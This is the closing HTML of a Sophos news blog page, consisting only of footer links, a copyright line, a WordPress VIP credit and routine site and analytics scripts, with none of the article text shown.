					<li><a href="https://www.sophos.com/en-us/company/rss-feeds.aspx"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/rss-icon.svg?la=en&amp;hash=76C4DAFD331DC675814191A66794A778D8C6DCF7" alt="RSS"></a></li>
					<li><a href="https://twitter.com/Sophos" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/twitter-icon.svg?la=en&amp;hash=9A90D9F99ABE6454741BBAAF9C3FB6966624C92D" alt="Twitter"></a></li>
					<li><a href="https://www.youtube.com/user/SophosProducts" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/youtube-icon.svg?la=en&amp;hash=CCCF647AFA78C8DB74D654DB9FEFBF0AC54F42D3" alt="YouTube"></a></li>
				</ul>
			</div>
			<ul class="links">
				<li><a href="https://www.sophos.com/en-us/company/careers.aspx">Careers </a></li>
				<li><a href="https://www.sophos.com/en-us/partners/partner-locator.aspx">Find a Partner</a></li>
				<li><a href="https://secure2.sophos.com/en-us/support.aspx">Support</a></li>
				<li><a href="https://www.sophos.com/en-us/threat-center/technical-papers.aspx">Technical Papers</a></li>
				<li><a href="https://www.sophos.com/en-us/security-news-trends/whitepapers.aspx">Whitepapers</a></li>
			</ul>
		</section>
		<section class="legal">
			<div class="copyright">&copy; 1997 - 2021 Sophos Ltd. All rights reserved</div>
			<ul>
				<li><a href="https://www.sophos.com/en-us/legal.aspx">Legal</a></li>
				<li><a href="https://www.sophos.com/en-us/legal/sophos-group-privacy-policy.aspx">Privacy</a></li>
				<li><a href="https://www.sophos.com/en-us/legal/cookie-information.aspx">Cookie Information</a></li>
				<li><a href="https://www.sophos.com/en-us/legal/modern-slavery-act-transparency-statement.aspx">Modern Slavery Statement</a></li>
			</ul>
		</section>
		<div class="vip" style="background: #002939">
			Powered by <a href="https://wpvip.com/?utm_source=vip_powered_wpcom&#038;utm_medium=web&#038;utm_campaign=VIP%20Footer%20Credit&#038;utm_term=news.sophos.com" rel="generator nofollow" class="powered-by-wpcom">WordPress VIP</a>		</div>
	</footer>
	<script id='sophos-js-core-js-extra'>
var PG8Data = {"startPage":"1","maxPages":"1","nextLink":""};
</script>
<script type='text/javascript' src='https://news.sophos.com/_static/??-eJyVkEEOwiAQRS8kIF20K+NRDLZjS8sAYcDq7R3TNHHhomTY8Hnvk4xao+iDz+CzyhMgkKIQp0AeVhLNWXdqJj4MhcWCeDaykZoDuQVyppM61NGHVEHDKydDx/ktkiVbV2/1BqOxo68Wo0nZQ6r2RlOtfLNdsr53ZQDa1orIBSJBdG+J1v+D+Ap4h+H3ff8Zi4iujNaTMoslhKxu7KpHSMjsFS+65em0PrfzB20wygw='></script>
<script src='https://stats.wp.com/e-202112.js' defer></script>
<script>
	_stq = window._stq || [];
	_stq.push([ 'view', {v:'ext',j:'1:9.5.2',blog:'166161023',post:'66075',tz:'-4',srv:'news.sophos.com'} ]);
	_stq.push([ 'clickTrackerInit', '166161023', '66075' ]);
</script>
</body>
</html>
